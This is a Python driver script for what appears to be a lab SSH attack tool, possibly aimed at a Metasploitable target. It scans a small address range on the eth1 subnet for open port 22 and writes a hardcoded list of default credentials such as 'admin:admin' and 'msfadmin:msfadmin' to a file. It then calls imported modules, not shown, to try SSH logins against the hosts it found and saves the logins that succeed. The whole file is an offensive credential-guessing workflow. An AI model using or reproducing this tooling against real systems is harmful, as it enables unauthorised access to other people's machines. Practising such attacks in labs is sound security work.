import socket
from netifaces import interfaces, ifaddresses, AF_INET
import network_service
import file_service
import ssh_service

filename_ip_to_scan = "./ip_address.txt"
filename_logins_pass = "./login_pswd.txt"
file_name_ssh_cxn_found="./ssh_login_found.txt"
search_index_ip_start = 125
search_index_ip_end = 130
scan_port = 22
logins_pswd=['user:password','toto:test123','admin:admin','admin:password','msfadmin:msfadmin']

def app_start():
    print("Application START")
    print("STEP 1 => delete files START ")
    file_service.delete_files([filename_ip_to_scan,filename_logins_pass,file_name_ssh_cxn_found])
    print("STEP 1 => END")
    print("==========================")
    print("STEP 2 => Explore ifacename START ")
    all_iface_and_ip= network_service.get_all_ifaces_with_ip()
    print("Explore ifacename result :",all_iface_and_ip)
    print("STEP 2 => END ")
    print("==========================")
    print("STEP 3 => Discovery interface eth1 START")
    network_service.discovery_network(all_iface_and_ip['eth1'][0],scan_port,search_index_ip_start,search_index_ip_end,filename_ip_to_scan)
    print("STEP 3 => END result save in file :",filename_ip_to_scan)
    print("==========================")
    print("STEP 4 => Generated file login password START")
    file_service.generated_file(filename_logins_pass,logins_pswd)
    print("STEP 4 => END result save in file :",filename_logins_pass)
    print("==========================")
    print("STEP 5 => Run attemps ssh login START")
    ssh_service.run_ssh_login_attempts(filename_ip_to_scan,filename_logins_pass,file_name_ssh_cxn_found)
    print("STEP 5 => END result save in file:",file_name_ssh_cxn_found)
    print("==========================")
    print("Application END")

app_start()







